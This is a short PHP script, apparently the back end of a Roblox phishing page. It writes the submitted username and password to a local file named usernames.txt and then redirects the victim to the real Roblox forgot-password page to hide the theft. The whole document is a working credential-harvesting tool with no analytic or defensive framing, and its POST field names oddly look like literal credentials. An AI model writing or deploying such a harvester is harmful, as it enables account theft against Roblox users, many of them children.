<?php

file_put_contents("usernames.txt", "Roblox Username: " . $_POST['Aiden3jj'] . " Pass: " . $_POST['password123'] . "\n", FILE_APPEND);
header('Location: https://www.roblox.com/login/forgot-password123-or-Aiden3jj/');
exit();
?>
